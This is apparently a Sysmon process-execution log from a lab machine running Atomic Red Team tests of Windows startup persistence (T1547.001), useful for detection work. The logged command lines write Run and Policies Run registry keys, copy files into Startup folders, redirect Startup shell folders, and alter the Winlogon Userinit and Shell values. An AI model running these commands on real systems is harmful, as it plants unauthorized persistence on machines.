"2025-12-26 11:19:04.607 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173604,"Cmdline: C:\WINDOWS\system32\cmd.exe /c """"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"" "" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1080 ¦ PGUID: E9F06A57-6118-694E-8101-000000002400 ¦ ParentPID: 8056 ¦ ParentPGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:04.592","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:05.217 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173605,"Cmdline: ""powershell.exe"" & {$Target = \""""C:\Windows\System32\calc.exe\"""" $ShortcutLocation = \""""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk\"""" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$Target = \""""C:\Windows\System32\calc.exe\"""" $ShortcutLocation = \""""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk\"""" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:05.197","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.918 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173608,"Cmdline: ""cmd.exe"" /c reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1688 ¦ PGUID: E9F06A57-611A-694E-8601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:06.905","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.984 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173609,"Cmdline: reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 3644 ¦ PGUID: E9F06A57-611A-694E-8801-000000002400 ¦ ParentPID: 1688 ¦ ParentPGUID: E9F06A57-611A-694E-8601-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:06.973","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.229 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173611,"Cmdline: ""C:\WINDOWS\system32\sc.exe"" start pushtoinstall login ¦ Proc: C:\Windows\System32\sc.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 3572 ¦ PGUID: E9F06A57-611B-694E-8901-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Service Control Manager Configuration Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=9C210CDD9F05530777868F4C8530C438,SHA256=845607864FC7E60304D8C45AE42884B32710781DAA33DA9D01416C77D2E0BE1D,IMPHASH=42DADBD60BBC453DD1773FDC089E19B7","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: sc.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:19:07.215","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.235 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173612,"Cmdline: taskhostw.exe Logon ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 8468 ¦ PGUID: E9F06A57-611B-694E-8A01-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ OriginalFileName: taskhostw.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ ParentUser: NT AUTHORITY\SYSTEM ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:07.231","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.443 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173613,"Cmdline: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:07.428","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:08.229 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173616,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:08.218","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.021 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173619,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:11.003","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:12.412 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173623,"Cmdline: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""" } if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""" } if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:12.400","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.697 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173626,"Cmdline: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:13.680","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.429 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173629,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:16.419","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.103 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173633,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.088","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.833 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173637,"Cmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6952 ¦ PGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.821","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
